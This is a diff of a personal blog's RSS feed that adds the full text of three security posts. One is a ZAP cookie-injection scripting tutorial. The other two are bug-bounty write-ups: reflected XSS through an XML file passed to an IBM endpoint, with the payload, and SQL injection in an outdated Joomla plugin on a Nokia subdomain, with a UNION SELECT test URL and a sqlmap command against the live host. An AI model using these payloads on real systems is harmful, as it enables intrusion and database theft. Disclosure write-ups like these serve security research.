@@ -1,6 +1,157 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Khaled Nassar</title><link>/posts/</link><description>Recent content in Posts on Khaled Nassar</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 17 Dec 2022 16:07:24 +0200</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>How to set cookies for zaproxy ajax spider manually</title><link>/posts/zaproxy_cookies/</link><pubDate>Sat, 17 Dec 2022 16:07:24 +0200</pubDate><guid>/posts/zaproxy_cookies/</guid><description>Greetings 👋! In this blog, we will learn how to manually insert cookies into the Ajax spider browser in Zaproxy
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Khaled Nassar</title><link>https://example.com/posts/</link><description>Recent content in Posts on Khaled Nassar</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>NonCommercial 4.0 International License</copyright><lastBuildDate>Sat, 17 Dec 2022 16:07:24 +0200</lastBuildDate><atom:link href="https://example.com/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>How to set cookies for zaproxy ajax spider manually</title><link>https://example.com/posts/how-to-set-cookies-for-zaproxy-ajax-spider-manually/</link><pubDate>Sat, 17 Dec 2022 16:07:24 +0200</pubDate><guid>https://example.com/posts/how-to-set-cookies-for-zaproxy-ajax-spider-manually/</guid><description>Greetings 👋! In this blog, we will learn how to manually insert cookies into the Ajax spider browser in Zaproxy
 Why? You cannot automate the logging process because sometimes the target uses Capatch on the login page, but you can log in and copy the cookies into Zap.
 You can control every aspect of Zaproxy using its scripting feature
-With Selenium&amp;rsquo;s Firefox or Chrome browser plugin, we can write a script that executes JavaScript code whenever the Selenium tab is opened in Zap</description></item><item><title> [IBM] XSS Reflected via xml files</title><link>/posts/ibm_xss/</link><pubDate>Mon, 26 Oct 2020 17:55:28 +0800</pubDate><guid>/posts/ibm_xss/</guid><description>Hello World 👋 while I&amp;rsquo;m doing some bug hunting on IBM subdomains I decided instead of using subdomain enumeration I can get interesting endpoints and parameters from waybackurls to shorten the time, after reading the URLs from waybackurls I noticed a lot of endpoints that contain some URLs of XML files in rssurl parameter
-https://www-356.ibm.com/partnerworld/wps/servlet/pwdyn/pw/rss/rsstojson.jsp?ccdb=no&amp;amp;rssurl=https://www-2000.ibm.com/file.xml&amp;amp;_=1596170198353 all this API endpoint do is read the XML from the URL and then return its value of it but in JSON, for the first time I thought there was an SSRF but after a lot of trying to bypass it, it doesn&amp;rsquo;t work at all</description></item><item><title>SQL Injection on Nokia subdomain</title><link>/posts/nokia_sqli/</link><pubDate>Mon, 04 Nov 2019 17:55:28 +0800</pubDate><guid>/posts/nokia_sqli/</guid><description>Hello 👋, I&amp;rsquo;ll share with you how I found sqli on Nokia that makes me able to login into the admin page you will not see something new here like new techniques or something, just simple steps
-after doing subdomain enumeration I found a subdomain that&amp;rsquo;s working with Joomla, after that I ran joomscan to get the version of the cms and plugins to see if there&amp;rsquo;s any outdated version to exploit it, and joomscan gives me an old plugin called JCK Editor with version 6.</description></item></channel></rss>
+With Selenium&amp;rsquo;s Firefox or Chrome browser plugin, we can write a script that executes JavaScript code whenever the Selenium tab is opened in Zap</description><content type="html"><![CDATA[<p>Greetings 👋! In this blog, we will learn how to manually insert cookies into the Ajax spider browser in Zaproxy</p>
+<h4 id="why">Why?</h4>
+<p>You cannot automate the logging process because sometimes the target uses Capatch on the login page, but you can log in and copy the cookies into Zap.</p>
+<p>You can control every aspect of Zaproxy using its scripting feature</p>
+<p>With Selenium&rsquo;s Firefox or Chrome browser plugin, we can write a script that executes JavaScript code whenever the Selenium tab is opened in Zap</p>
+<p><img src="https://i.ibb.co/qRWHXWn/image.png" alt="selenium_tab"></p>
+<h4 id="steps">Steps</h4>
+<ol>
+<li>Visit your application and log in</li>
+<li>With Zap Breakpoint, inspect the request from your browser</li>
+<li>Copy the value of the Cookie header</li>
+<li>Execute this Python script and then copy the output into the Zap Javascript code</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#34;login=test/test; token=12345&#34;</span> | python3 cookies.py
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> http.cookies <span style="color:#f92672">import</span> SimpleCookie
+</span></span><span style="display:flex;"><span>cookie <span style="color:#f92672">=</span> SimpleCookie()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> rawdata <span style="color:#f92672">in</span> sys<span style="color:#f92672">.</span>stdin:
+</span></span><span style="display:flex;"><span>    rawdata <span style="color:#f92672">=</span> rawdata<span style="color:#f92672">.</span>rstrip()
+</span></span><span style="display:flex;"><span>    cookie<span style="color:#f92672">.</span>load(rawdata)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cookies <span style="color:#f92672">=</span> {k: v<span style="color:#f92672">.</span>value <span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> cookie<span style="color:#f92672">.</span>items()}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> cookie<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;window.localStorage.setItem(&#39;</span><span style="color:#e6db74">{</span>k<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#e6db74">{</span>v<span style="color:#f92672">.</span>value<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;);&#34;</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span></code></pre></div><ul>
+<li>Replace the <code>jsUrl</code> value with your domain target</li>
+<li>Set the Script output in script var</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ScriptVars</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;org.zaproxy.zap.extension.script.ScriptVars&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">jsUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost:3000&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">browserLaunched</span>(<span style="color:#a6e22e">ssutils</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">logger</span>(<span style="color:#e6db74">&#39;browserLaunched &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ssutils</span>.<span style="color:#a6e22e">getBrowserId</span>());
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wd</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ssutils</span>.<span style="color:#a6e22e">getWebDriver</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ssutils</span>.<span style="color:#a6e22e">waitForURL</span>(<span style="color:#ae81ff">5000</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#a6e22e">jsUrl</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">logger</span>(<span style="color:#e6db74">&#39;url: &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; setting token &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">script</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;document.cookie = \&#39;token=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\&#39;;\n&#39;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;window.localStorage.setItem(\&#39;token\&#39;, \&#39;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\&#39;);&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">wd</span>.<span style="color:#a6e22e">executeScript</span>(<span style="color:#a6e22e">script</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Logging with the script name is super helpful!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">logger</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;[&#39;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#39;zap.script.name&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;] &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">arguments</span>[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span><span style="color:#f92672">-- var script = &#39;document.cookie = \&#39;token=&#39; + token + &#39;\&#39;;\n&#39; +
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">--    &#39;window.localStorage.setItem(\&#39;token\&#39;, \&#39;&#39; + token + &#39;\&#39;);&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">++ var script = &#39;document.cookie = \&#39;login=test/test; token=12345\&#39;;&#39; + &#39;\n&#39; +
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">++    &#34;window.localStorage.setItem(&#39;login&#39;,&#39;test/test&#39;);window.localStorage.setItem(&#39;token&#39;,&#39;12345&#39;);&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>&#39;
+</span></span></code></pre></div><h4 id="real-example">Real Example</h4>
+<p><img src="https://i.ibb.co/8X9fP0h/image.png" alt="demo_php"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>	<span style="color:#75715e">// This script will log a browser into Juice Shop when forced user mode is enabled.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// The &#39;Juice Shop Session Management.js&#39; script must have been set to authenticate correctly.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// Make sure to use the version of that script in this repo rather than the one included with ZAP 2.9.0 as
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// it has been enhanced to support this script.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//Change the jsUrl var if the instance of Juice Shop you are using is not listening on http://localhost:3000
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">jsUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://testphp.vulnweb.com/&#39;</span>;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">browserLaunched</span>(<span style="color:#a6e22e">ssutils</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">logger</span>(<span style="color:#e6db74">&#39;browserLaunched &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ssutils</span>.<span style="color:#a6e22e">getBrowserId</span>());
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wd</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ssutils</span>.<span style="color:#a6e22e">getWebDriver</span>();
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">wd</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">jsUrl</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ssutils</span>.<span style="color:#a6e22e">waitForURL</span>(<span style="color:#ae81ff">5000</span>);
+</span></span><span style="display:flex;"><span>   			<span style="color:#a6e22e">logger</span>(<span style="color:#a6e22e">url</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#a6e22e">jsUrl</span>)) {
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">script</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;document.cookie = \&#39;login=test/test\&#39;;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>					<span style="color:#e6db74">&#39;window.localStorage.setItem(\&#39;login\&#39;, \&#39;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;test/test&#39;</span><span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\&#39;);&#39;</span>;
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">wd</span>.<span style="color:#a6e22e">executeScript</span>(<span style="color:#a6e22e">script</span>);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Logging with the script name is super helpful!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">logger</span>() {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;[&#39;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#39;zap.script.name&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;] &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">arguments</span>[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div>]]></content></item><item><title> [IBM] XSS Reflected via xml files</title><link>https://example.com/posts/ibm-xss-reflected-via-xml-files/</link><pubDate>Mon, 26 Oct 2020 17:55:28 +0800</pubDate><guid>https://example.com/posts/ibm-xss-reflected-via-xml-files/</guid><description>Hello World 👋 while I&amp;rsquo;m doing some bug hunting on IBM subdomains I decided instead of using subdomain enumeration I can get interesting endpoints and parameters from waybackurls to shorten the time, after reading the URLs from waybackurls I noticed a lot of endpoints that contain some URLs of XML files in rssurl parameter
+https://www-356.ibm.com/partnerworld/wps/servlet/pwdyn/pw/rss/rsstojson.jsp?ccdb=no&amp;amp;rssurl=https://www-2000.ibm.com/file.xml&amp;amp;_=1596170198353 all this API endpoint do is read the XML from the URL and then return its value of it but in JSON, for the first time I thought there was an SSRF but after a lot of trying to bypass it, it doesn&amp;rsquo;t work at all</description><content type="html"><![CDATA[<p>Hello World 👋
+while I&rsquo;m doing some bug hunting on IBM subdomains I decided instead of using subdomain enumeration I can get interesting endpoints and parameters from <code>waybackurls</code> to shorten the time, after reading the URLs from waybackurls I noticed a lot of endpoints that contain some URLs of XML files in <code>rssurl</code> parameter</p>
+<pre tabindex="0"><code>https://www-356.ibm.com/partnerworld/wps/servlet/pwdyn/pw/rss/rsstojson.jsp?ccdb=no&amp;rssurl=https://www-2000.ibm.com/file.xml&amp;_=1596170198353
+</code></pre><p><img src="https://1.bp.blogspot.com/-7Dz0qMUTtE0/X5bYy8O2QfI/AAAAAAAAEYw/gioHZXy_lps0DyITLNrJhQFlaCXmV-GHwCLcBGAsYHQ/s1600/Screenshot_at_2020-08-09_18-52-24.png" alt="ibm_xml"></p>
+<p>all this API endpoint do is read the XML from the URL and then return its value of it but in JSON, for the first time I thought there was an SSRF but after a lot of trying to bypass it, it doesn&rsquo;t work at all</p>
+<p><img src="https://media.tenor.com/RTdXxzgoQewAAAAC/chihuahua-basal.gif" alt="noway"></p>
+<p>but from another side, I noticed that the response <code>Content-type</code> is <code>text/HTML</code> so I think I can do an xss here, the idea is I can make an XML file that contains the xss payload in one of the variables so after converting it to JSON it will be reflected in the page as an HTML code, like this <code>{&quot;data&quot;: &quot;&lt;script&gt;alert(123)&lt;/script&gt;&quot;}</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-XML" data-lang="XML"><span style="display:flex;"><span><span style="color:#f92672">&lt;html&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;head&gt;&lt;/head&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;body&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;something:script</span> <span style="color:#a6e22e">xmlns:something=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xhtml&#34;</span><span style="color:#f92672">&gt;</span>alert(1)<span style="color:#f92672">&lt;/something:script&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;a:script</span> <span style="color:#a6e22e">xmlns:a=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xhtml&#34;</span><span style="color:#f92672">&gt;</span>alert(2)<span style="color:#f92672">&lt;/a:script&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;info&gt;</span>
+</span></span><span style="display:flex;"><span>		  <span style="color:#f92672">&lt;name&gt;</span>
+</span></span><span style="display:flex;"><span>		    <span style="color:#f92672">&lt;value&gt;</span><span style="color:#75715e">&lt;![CDATA[&lt;script&gt;confirm(document.domain)&lt;/script&gt;]]&gt;</span><span style="color:#f92672">&lt;/value&gt;</span>
+</span></span><span style="display:flex;"><span>		  <span style="color:#f92672">&lt;/name&gt;</span>
+</span></span><span style="display:flex;"><span>		    <span style="color:#f92672">&lt;description&gt;</span>
+</span></span><span style="display:flex;"><span>		      <span style="color:#f92672">&lt;value&gt;</span>Hello<span style="color:#f92672">&lt;/value&gt;</span>
+</span></span><span style="display:flex;"><span>		    <span style="color:#f92672">&lt;/description&gt;</span>
+</span></span><span style="display:flex;"><span>		    <span style="color:#f92672">&lt;url&gt;</span>
+</span></span><span style="display:flex;"><span>		      <span style="color:#f92672">&lt;value&gt;</span>http://google.com<span style="color:#f92672">&lt;/value&gt;</span>
+</span></span><span style="display:flex;"><span>		    <span style="color:#f92672">&lt;/url&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;/info&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;/body&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/html&gt;</span>
+</span></span></code></pre></div><p>then upload the file to my site and pass the URL to the rssurl parameter</p>
+<p>the file should be converted like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;html&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;head&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;body&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;script&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;alert(1)&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;alert(2)&#34;</span>
+</span></span><span style="display:flex;"><span>      ],
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;info&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>: {
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;value&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;__cdata&#34;</span>: <span style="color:#e6db74">&#34;&lt;script&gt;confirm(document.domain)&lt;/script&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;description&#34;</span>: {
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;Hello&#34;</span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;url&#34;</span>: {
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;http://google.com&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>and boom</p>
+<p><img src="https://1.bp.blogspot.com/-BHQh_JQb0Uc/X5bZv80_nnI/AAAAAAAAEY8/hn-Ok2MGjcca4ixkIZpeUgQ1kqCYH5OvwCLcBGAsYHQ/s1600/Screenshot_at_2020-08-09_18-54-51.png" alt="xss_boom"></p>
+<p>see ya 🤞 ❤️</p>
+]]></content></item><item><title>SQL Injection on Nokia subdomain</title><link>https://example.com/posts/sql-injection-on-nokia-subdomain/</link><pubDate>Mon, 04 Nov 2019 17:55:28 +0800</pubDate><guid>https://example.com/posts/sql-injection-on-nokia-subdomain/</guid><description>Hello 👋, I&amp;rsquo;ll share with you how I found sqli on Nokia that makes me able to login into the admin page you will not see something new here like new techniques or something, just simple steps
+after doing subdomain enumeration I found a subdomain that&amp;rsquo;s working with Joomla, after that I ran joomscan to get the version of the cms and plugins to see if there&amp;rsquo;s any outdated version to exploit it, and joomscan gives me an old plugin called JCK Editor with version 6.</description><content type="html"><![CDATA[<p>Hello 👋, I&rsquo;ll share with you how I found sqli on Nokia that makes me able to login into the admin page
+you will not see something new here like new techniques or something, just simple steps</p>
+<p>after doing subdomain enumeration I found a subdomain that&rsquo;s working with Joomla, after that I ran joomscan to get the version of the cms and plugins to see if there&rsquo;s any outdated version to exploit it, and joomscan gives me an old plugin called <code>JCK Editor</code> with version <code>6.4.4</code>
+and after searching with this version on exploit-DB i found SQLI injection in this version <a href="https://www.exploit-db.com/exploits/45423">CVE-2018-17254</a></p>
+<pre tabindex="0"><code>Test = [HOST]/[PATH]/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&amp;view=menu&amp;parent=%22%20UNION%20SELECT%20NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL--%20aa
+</code></pre><p><img src="https://1.bp.blogspot.com/-LgYxMfeJKhs/Xscwx2tKONI/AAAAAAAAEMs/HJ5I5jgXFv8ExESVK3bm0Mk2hpQWbDiagCK4BGAsYHg/nokiasql.png" alt="sql_nokia"></p>
+<p>as you can see, we can get the version of the database 🔍</p>
+<p>this time for my fav weapon (SQLMAP)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#39;https://gdclive.nokia.com/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&amp;view=menu&amp;parent=&#39;</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --random-agent --technique<span style="color:#f92672">=</span>U -p parent --batch --current-DB --current-user
+</span></span></code></pre></div><p>you can see the current user and the name of the database :)</p>
+<p>After dumping all databases using the &ndash;all option and unencrypt the password of the admin account let&rsquo;s login in admin panel</p>
+<p><img src="https://1.bp.blogspot.com/-87ctqF3EmDM/XscxFpvVAhI/AAAAAAAAENE/Cgi-Kfnjxco0cND_FONrVmsOWySdiu_SQCK4BGAsYHg/cp.jpg" alt="nokia_pwn"></p>
+<p>see ya ✌️</p>
+]]></content></item></channel></rss>
